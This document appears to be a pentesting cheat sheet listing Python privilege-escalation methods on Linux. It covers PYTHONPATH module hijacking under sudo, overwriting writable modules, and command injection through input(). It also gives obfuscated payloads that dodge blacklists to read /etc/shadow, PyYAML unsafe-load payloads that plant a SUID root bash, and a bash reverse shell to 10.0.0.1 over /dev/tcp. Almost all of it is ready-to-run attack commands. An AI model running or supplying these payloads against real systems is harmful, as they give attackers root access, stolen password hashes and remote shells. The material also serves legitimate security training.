### There are multiple ways to escalate with python

## EXAMPLES:

# MODULE HIJACKING

#### 1) SETENV: NOPASSWD /usr/bin/python /home/whatever/script.py

#### 2) Check if you can overwrite an already existing module in python, or simply create the missing import module that the script asks

#### E.g.: ImportError: No module named pwned

#### 3) Create the malicious binary in any directory we have write access to (/tmp directory as usual)

#### 4) The payload can be (import os; os.system('/bin/bash') or a python reverse shell.

#### 5) chmod +x pwned.py

#### 6) sudo PYTHONPATH/tmp/ /usr/bin/python /home/whatever/script.py

#### 7) Enjoy root!

# SUDO PRIVILEGE ESCALATION

#### 1) NOPASSWD: /usr/bin/python /home/USER/script.py

#### 2) If the python script is under the current user's home directory, we can remove the script and create the new one with the same name.

#### rm -rf /home/USER/script.py

#### touch /home/USER/script.py

#### 3) Insert payload (import os;os.system('/bin/bash')

#### 4) GGEZ

# MODULE OVERRIDING 

#### If the Python script contains a module that can be modified by current user, we can inject arbitrary code into the module.

#### 1) First, check what modules the Python script uses.

#### 2) find / -name "random.py" 2>/dev/null

#### 3) ls -la /usr/lib/python3.6/random.py

#### 4) If we have write permissions on the file, we can inject our own malicious code for privesc (import os; os.system('/bin/bash')

#### 5) Execute for root shell ;)

# OS COMMANDS IN INPUT()

#### 1) If the python executable asks for input, you can try to enter OS commands like:

#### 2) Input: __import__('os').system('id')

# BLACKLISTED PYTHON MODULES

### Examples: 

#### eval, exec, import, open, os, read, system, write

#### Bypass techniques: String obfuscation

#### Payload: print(globals())
#### print(getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat /etc/shadow'))
#### __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /etc/shadow')

#### Bypass techniques: Input

#### If the "eval" or "exec" modules are accepted, we can input arbitrary code.

#### eval(input()) or exec(input())

#### print(open("/etc/passwd", "r").read())

# PYTHON YAML PRIVILEGE ESCALATION

### Python yaml package is vulnerable to execute arbitrary commands

#### 1) import yaml; filename = "example.yml"; yaml.load()

#### 2) Payload: 

#### import yaml

#### from yaml import Loader, UnsafeLoader

#### data = b'!!python/object/new:os.system ["cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u+sx /tmp/bash"]'

#### yaml.load(data)

#### yaml.load(data, Loader=Loader)

#### yaml.load(data, Loader=UnsafeLoader)

#### yaml.load_all(data)

#### yaml.load_all(data, Loader=Loader)

#### yaml.load_all(data, Loader=UnsafeLoader)

#### yaml.unsafe_load(data)

#### 3) /tmp/bash -p

### Base64 Encoding RCE

#### 1) yaml.load(b64decode(b"ISFweXRa...YXNoIl0="))

### Reverse Shell

#### 1) start listener: nc -lvnp 1234

#### 2) Execute python script that contains YAML code as root:

#### import yaml

#### yaml.load('!!python/object/new:os.system ['bash -c "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1"'])
